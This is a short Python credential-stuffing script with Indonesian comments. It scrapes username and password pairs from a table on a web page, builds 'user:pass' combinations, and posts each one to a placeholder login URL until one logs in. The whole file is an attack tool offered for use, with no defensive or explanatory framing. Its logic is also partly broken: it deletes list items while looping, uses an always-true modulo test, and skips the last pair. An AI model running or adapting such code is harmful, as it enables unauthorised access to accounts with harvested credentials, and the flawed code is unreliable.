from selenium import webdriver
from bs4 import BeautifulSoup
import requests

#INISIALISASI WEBDRIVER
driver = webdriver.Chrome()                 
driver.get("https://ayogram.com/widpedia/")

data = []
username = []
password = []
empas = []

#PARSING DENGAN BeautifulSoup
content = driver.page_source
soup = BeautifulSoup(content, 'html.parser') 

#CARI TABEL DATA
for a in soup.find_all('td'):                
    b = a.get_text()                         
    data.append(b)

#HAPUS INDEX YANG TIDAK PERLU
i = 1
while i < len(data):                     
    if i%2 == 0:
        # print ("deleting arr %d" % i)
        del data[i]
        i+=1
    else:
        i += 1

#MENYARING USERNAME DAN PASSWORD
i = 0
while i < len(data):
        if i%2 == 0:
            print ("Adding %s to username list.." % data[i])
            username.append(data[i])
        elif i%1 == 0:
            print ("Adding %s to password list.." % data[i])
            password.append(data[i])
        i += 1

#MEMBUAT LIST EMAIL PASSWORD di empas LIST
c = 0
while c < len(username) - 1:
    a = (str(username[c]) + ":" + str(password[c]))
    empas.append(a)
    c += 1

print ("Trying to login...")

for i in empas:
    #SPLIT EMAIL PASSWORD
    str(i)
    val = i.split(':')
    USERNAME = str(val[0])
    PASSWORD = str(val[1])
    print ("Trying %s with password %s " % (USERNAME, PASSWORD))
    
    #INISIALISASI LOGIN PAGE & DATA
    URL = "<login_page>"
    DATA = {'username': USERNAME, 'password': PASSWORD}

    r = requests.post(url = URL, data = DATA)
    response = str(r.content)

    #ERROR CONDITION
    res_salah = response.find('SALAH')
    res_session = response.find('SESSION')
    if res_salah > 0:
        print ("Password salah!")
    elif res_session > 0:
        print ("Sudah ada session")
    elif res_salah == -1 and res_session == -1:
        print ("LOGGED IN with username %s and password %s " % (USERNAME, PASSWORD))
        break
    else:
        print ("UNKNOWN ERROR OCCURED")